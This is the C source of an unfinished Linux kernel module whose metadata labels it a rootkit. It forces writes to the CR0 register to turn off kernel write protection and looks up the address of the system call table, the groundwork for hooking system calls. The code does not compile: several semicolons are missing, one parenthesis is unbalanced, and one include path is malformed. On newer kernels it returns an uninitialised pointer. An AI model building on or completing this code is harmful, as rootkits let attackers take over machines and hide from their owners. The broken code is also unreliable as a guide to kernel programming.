#include <linux/init.h>             //must have to make a kernal module
#include <linux/module.h>           //must have to make a kernal module
#include <linux/kernel.h>           //to ger kernal methods
#include <linux/syscalls.h>         // to get syscalltable
#include <linux/kallsyms.h>         //also to get acces to kallsysm_lookup_name
#include <linux/kprobes.h>          //work around for kernal 5.6.0 and above
#include <linux/unistd.h>           // contains syscall numbers
#include < linux/version.h>         // linux/ kernel versions 

MODULE_LICENSE("GPL");
MODULE_AUTHOR("infernexio");
MODULE_DESCRIPTION("rootkit");
MODULE_VERSION("0.0.1");

unsigned long *__sys_call_table = NULL;

/**
 * Custom write_cr0 function to unprotect memory
 * this gets past the checks that the write_cr0 has
 */
static inline void write_cr0_forced(unsigned long val){
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

/**
 * Disables write protection
*/
static void unprotect_memory(void){
    write_cr0_forced(read_cr0() & (~ 0x10000);
    printk(KERN_INFO "unportected memory\n");
}

/**
 * enables memory protection
*/
static void protect_memory(void){
    write_cr0_forced(read_cr0() | (0x10000));
    printk(KERN_INFO "protected memory\n");
}

/**
 * checks kernel version and gets address of syscall table
 * @return - returns the memory adress of the syscall table
*/
static unsigned long *get_syscall_table(void){
    unsigned long *syscall_table

    #if LINUX_VERSION_CODE < KERNEL_VERSION(5,4,0)
        syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    #endif

        return syscall_table
}

/**
 * start of the rootkit
 * like the main method
*/
static int __init init_func(void){
    printk(KERN_INFO "rootkit: initalized\n");

    __sys_call_table = get_syscall_table();

    return 0;
}

/**
 * exit of the rootkit
*/
static void __exit exit_func(void){
    printk(KERN_INFO "rootkit: stoped\n");
}

/**
 * sets the init and exit methods
*/
module_init(init_func);
module_exit(exit_func);
